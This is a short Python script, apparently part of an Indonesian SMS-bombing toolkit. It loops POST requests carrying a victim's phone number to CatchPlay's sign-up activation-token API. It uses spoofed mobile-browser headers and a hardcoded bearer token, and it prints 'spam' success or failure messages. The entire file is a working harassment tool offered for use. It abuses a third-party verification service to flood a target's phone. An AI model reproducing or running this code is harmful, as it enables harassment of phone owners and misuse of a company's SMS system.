import requests,os,sys,json
from time import sleep
from war.war import *

def play(nom, jml):
	sleep(2)
	print("")
	r = requests.Session()
	dat = json.dumps({"cellPhone":nom})

	head = {
	"Host": "sunapi.catchplay.com",
	"content-length": "28",
	"accept": "application/json",
	"asiaplay-device-version": "3.0.0.329",
	"user-agent": "Mozilla/5.0 (Linux; Android 6.0; A1601) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
	"accept-language": "in-ID",
	"authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJncmFudF90eXBlIjoiY2xpZW50X2NyZWRlbnRpYWxzIiwic2NvcGUiOlsiLioiXSwiaXNzIjoiU1VOLUF1dGgiLCJleHAiOjE1OTc1ODI1NzksImlhdCI6MTU5NzQ5NjE3OSwiY2xpZW50X2lkIjoiYmQyOGE4ZTYtMGE0NC00YTcwLTg2NjItMWI2NjExZjM4YTJlIn0.1-ZJSczH3aCieFSEPZq-xoqiEhjgRQmmfiSaLlIzOgM",
	"asiaplay-device-type": "WEB_Mobile",
	"content-type": "application/json",
	"origin": "https://www.catchplay.com",
	"referer": "https://www.catchplay.com/id/sign-up/mobile",
	}

	for x in range(jml):
	  cal = r.post("https://sunapi.catchplay.com/accounts/activationToken?",headers=head,data=dat)
	  if 'code' in cal.text:
	       print(f"{k}[+] {c}Spam ke {k}{nom} {c}Berhasil ")
	       sleep(2)
	  else:
	       print(f"{r}[+] {c}Spam ke {nom} {c}Gagal!! ")
	       sleep(1.5)
